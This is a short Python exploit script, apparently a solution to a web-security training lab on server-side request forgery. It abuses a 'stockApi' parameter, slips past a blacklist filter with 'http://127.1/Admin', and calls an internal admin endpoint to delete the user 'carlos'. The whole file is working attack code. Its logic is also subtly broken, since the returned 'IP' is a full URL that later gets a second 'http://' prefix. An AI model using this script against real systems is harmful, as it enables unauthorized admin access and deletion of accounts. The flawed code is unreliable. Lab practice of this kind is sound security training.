# Lab: SSRF with blacklist-based input filter
import sys
import urllib3
import requests
import os
from dotenv import load_dotenv


load_dotenv()


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
    'https': "https://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}


def delete_user(stock_path, admin_ipaddr):
    delete_path = "/delete?username=carlos"
    data = {"stockApi": f"http://{admin_ipaddr}/admin{delete_path}"}
    r = requests.post(stock_path, data=data, verify=False, proxies=proxies)

    check_admin_url = "http://%s/admin" % admin_ipaddr
    data2 = {"stockApi": check_admin_url}

    r = requests.post(stock_path, data=data2, verify=False, proxies=proxies)

    if "User deleted successfully" in r.text:
        print("(-> Successfully deleted user")
    else:
        print("(-) Couldn't delete user")
        exit(-1)


def check_admin_hostname(stock_url):
    print("(-> Finding IP...")
    hostname = "http://127.1/Admin"
    data = {"stockApi": hostname}
    r = requests.post(stock_url, data=data, verify=False, proxies=proxies)

    if r.status_code == 200:
        admin_ipaddr = hostname
        return admin_ipaddr
    else:
        print("(-) Couldn't find admin hostname")
        exit(-1)


def ssrf_to_delete_user(url):
    stock_path = url + "/product/stock"
    admin_ipaddr = check_admin_hostname(stock_path)
    delete_user(stock_path, admin_ipaddr)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    ssrf_to_delete_user(url)


if __name__ == "__main__":
    main()
